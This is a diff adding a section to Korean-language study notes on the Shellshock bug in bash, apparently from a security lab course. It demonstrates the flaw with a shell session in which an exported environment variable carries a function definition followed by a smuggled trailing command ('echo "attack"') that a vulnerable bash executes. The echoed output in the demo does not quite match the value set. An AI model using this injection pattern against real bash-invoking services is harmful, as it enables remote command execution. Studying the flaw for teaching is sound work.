@@ -101,6 +101,26 @@ hello
 	- 자식 프로세스가 bash를 실행하면 bash는 환경 변수를 함수 정의로 다시 해석 =. approach 2
 	- approach 2는 부모 프로세스가 쉘 프로세스일 필요가 없다 → 환경변수만 사용 가능하면 됨
 
+- shellshock vulnerability
+	- 부모 프로세스는 환경 변수를 통해 자식 쉘 프로세스에 함수 정의 전달
+	- 이때 구문 분석 논리 버그로 인해 bash는 변수에 포함된 일부 명령 실행
+```shell
+$ foo='() {echo "hello";}; echo "attack";'
+$ echo $foo
+() { echo "hello world"; }; echo "attack";
+$ export foo
+$ bash_shellshock
+-> run bash (vulnerable ver)
+attack
+-> extra command gets executed!
+-----------------child--------------------
+$ echo $foo
+
+$ declare -f foo
+foo (){
+	echo "hello"
+}
+```
 
 
 
